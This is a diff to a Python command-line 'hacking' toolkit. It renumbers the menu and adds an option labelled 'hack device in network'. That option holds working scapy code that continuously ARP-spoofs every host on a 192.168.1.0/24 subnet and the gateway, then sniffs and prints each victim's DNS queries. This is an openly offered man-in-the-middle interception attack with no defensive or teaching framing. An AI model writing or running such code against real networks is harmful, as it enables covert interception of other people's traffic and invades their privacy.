@@ -11,10 +11,11 @@ from rich import print
 import requests
 
 
-print("              1.[italic red]ip adress of the server        [/]5.[italic red]general information of the")
-print("              2.[italic red]web server status_code         [/]6.[italic red]ip location finder             ")
-print("              3.[italic red]paths scaning                  [/]7.[italic red]base64 decode ")
-print("              4.[italic red]base58 decode                  [/]8.[italic red]server information")      
+print("              1.[italic red]ip adress of the server        [/]6.[italic red]general information of the")
+print("              2.[italic red]web server status_code         [/]7.[italic red]ip location finder             ")
+print("              3.[italic red]paths scaning                  [/]8.[italic red]base64 decode ")
+print("              4.[italic red]base58 decode                  [/]9.[italic red]server information")      
+print("              5.[italic red]oisnt tool                     [/]10.[italic red]hack device in network")
 choice = input("choice your option : ")
 
 
@@ -97,6 +98,9 @@ elif choice == "4" :
     print("-"*50)
 
 elif choice == "5" :
+    pass
+
+elif choice == "6" :
     import requests 
 
     print("-"*50)
@@ -112,7 +116,7 @@ elif choice == "5" :
     print("Time finished : " + str(datetime.now()))
     print("-"*50)
 
-elif choice == "6" :
+elif choice == "7" :
     import geocoder
     import folium
     from geocoder import ip
@@ -136,7 +140,7 @@ elif choice == "6" :
     print("Time finished : " + str(datetime.now()))
     print("-"*50)
 
-elif choice == "7" : 
+elif choice == "8" : 
     import base64
 
     user = input("Enter the base64 hash : ")
@@ -158,7 +162,7 @@ elif choice == "7" :
     print("Time finished : " + str(datetime.now()))
     print("-"*50)
 
-elif choice == "8" :
+elif choice == "9" :
     url = input("Enter the url : ")
 
     print("-" * 50)
@@ -173,6 +177,44 @@ elif choice == "8" :
     print("Thanks for using this tool.")
     print("Time finished : " + str(datetime.now()))
     print("-"*50)
+
+elif choice == "10" :
+    import logging
+    from scapy.all import ARP , send , sniff 
+    from scapy.layers.dns import DNS , DNSQR ,IP
+    import threading
+    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+    def arp_spoof(target_ip,spoof_ip):  
+        packet = ARP(op=2,pdst=target_ip,hwdst='ff:ff:ff:ff:ff:ff',psrc=spoof_ip)
+        # ARP => ARP Requests |ARP Replay
+        #op => option => 1:Requests,2:Replay
+        #pdst => protocole distanation => target_ip 
+        #hwdst => hardware destination => mac_adress | broadcast
+        #psrc => protocol source => my ip
+        send(packet,verbose=False)
+
+    def dns_packet(packet):
+        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0 :
+            ip_src = packet[IP].src
+            dns_query = packet[DNSQR].qname.decode()
+            print(ip_src,dns_query)
+    
+    def start_arp(target_ip,getway_ip):
+        while True :
+            arp_spoof(target_ip,getway_ip)        
+            arp_spoof(getway_ip,target_ip)
+
+    target_ip = "192.168.1.0/24"
+    getway_ip = "192.168.1.1"
+
+    threading.Thread(target=start_arp,args=(target_ip,getway_ip),daemon=True).start()
+
+    print("[+] Network traffic : 2026")
+    print("-" * 40)
+    print(f"{'IP Adress':<15} \t {'DNS Query':<30}")
+    print("-" * 40)
+    sniff(filter="udp port 53", prn=dns_packet,store=0)
 
 else :
     print("invalid chose!")
